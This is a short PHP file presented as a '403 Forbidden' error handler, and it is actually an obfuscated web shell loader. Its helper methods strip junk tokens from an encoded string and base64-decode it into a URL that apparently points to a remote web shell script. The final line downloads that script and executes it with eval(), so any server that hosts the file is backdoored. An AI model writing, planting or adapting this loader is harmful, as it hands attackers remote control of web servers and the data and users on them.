<?php
/**
 Forbdidden 403
 Base Error
**/

class Forbidden {
	public function ForbiddenVal($val) {
		return eval($val);
	}
	public function Base($base) {
		$base_ = $this->Error($base);
		return base64_decode($base_);
	}
	public function Error($err) {
		$errCode = str_replace(array("/_a9", "_+zB", "_\y0"), "", $err);
		return $errCode;
	}
}

$error = New Forbidden;
$error->ForbiddenVal(file_get_contents($error->Base("aHR/_a90cHM6_\y0Ly9yYXcuZ2l_+zB0aHVidXN_\y0lcmNvbnRlb/_a9nQuY29tL3hk_\y0YXZpYW4v_+zBc2hlbGwv/_a9bWFpbi_\y09pbmRve_+zBHBsb2l0LX_\y0Yy")));

?>
